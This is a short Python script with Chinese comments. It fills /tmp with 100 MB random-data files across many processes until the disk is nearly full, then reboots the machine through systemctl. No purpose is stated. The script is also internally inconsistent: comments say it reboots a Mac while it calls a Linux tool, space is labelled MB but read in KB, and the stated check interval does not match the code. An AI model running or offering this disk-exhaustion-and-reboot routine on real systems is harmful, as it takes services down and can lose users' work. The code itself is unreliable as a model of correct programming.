#!/usr/bin/env python

import os  
import random
import string  
import time  
import subprocess  
import multiprocessing  
  
def generate_random_file(file_path, size_mb):  
    """生成指定大小的随机数据文件"""  
    size_bytes = size_mb * 1024 * 1024  
    random_bytes = os.urandom(size_bytes)  # 生成指定大小的随机字节  
    with open(file_path, 'wb') as file:  
        file.write(random_bytes)  # 一次性写入文件  
    print(f"文件 {file_path} 已生成，大小：{size_mb} MB")  
  
def main():  
    folder_path = '/tmp'  
    file_size_mb = 100  # 可以根据需要调整文件大小  
    file_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))  
    file_extension = '.dat'  
    files_count = 0  # 记录生成的文件数量  
    pool = multiprocessing.Pool()  # 创建进程池  
    cpu_count = multiprocessing.cpu_count()
    while get_free_space() > 256 * 1024:
        print(f"已生成{files_count}个文件，当前剩余空间：{get_free_space()} KB") 
        if len(pool._pool) < cpu_count*10:  
            for _ in range(cpu_count):  # 根据CPU核心数创建相同数量的进程  
                file_name = file_prefix + str(files_count) + file_extension  
                file_path = os.path.join(folder_path, file_name)  
                process = pool.apply_async(generate_random_file, (file_path, file_size_mb))  
                files_count += 1  
        time.sleep(1)  # 每10s检查一次可用空间  
    print("所有文件生成完毕，剩余空间为零，重启Mac...")  
    subprocess.call(['/usr/sbin/systemctl', 'reboot'])  # 使用systemctl命令重启Mac  
    pool.close()  # 关闭进程池  
    pool.join()  # 等待所有进程执行完毕  
  
def get_total_space():  
    """获取磁盘总可用空间（以MB为单位）"""  
    total_space = os.popen('df /tmp | awk \'{print $2}\' | tail -1').read().strip()  
    return int(total_space)  
  
def get_free_space():  
    """获取当前磁盘可用空间（以MB为单位）"""  
    free_space = os.popen('df /tmp | awk \'{print $4}\' | tail -1').read().strip()  
    return int(free_space)  
  
if __name__ == '__main__':  
    main()
